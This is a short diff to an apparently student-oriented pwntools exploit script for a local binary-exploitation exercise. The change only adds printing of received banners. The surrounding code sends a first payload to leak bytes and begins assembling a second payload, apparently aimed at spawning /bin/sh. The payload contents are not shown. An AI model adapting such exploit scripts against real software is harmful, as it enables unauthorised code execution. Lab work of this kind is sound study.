@@ -46,12 +46,14 @@ f.close()
 
 p = process("./bin")
 raw_input(f"attach with gdb, then press enter:\ngdb -p {p.pid}")
-p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
+r = p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
+print(r)
 p.sendline(payload1)
 r = p.recvn(7)
 print(binascii.b2a_hex(r))
 
-p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
+r = p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
+print(r)
 
 payload2 = (
     buffer
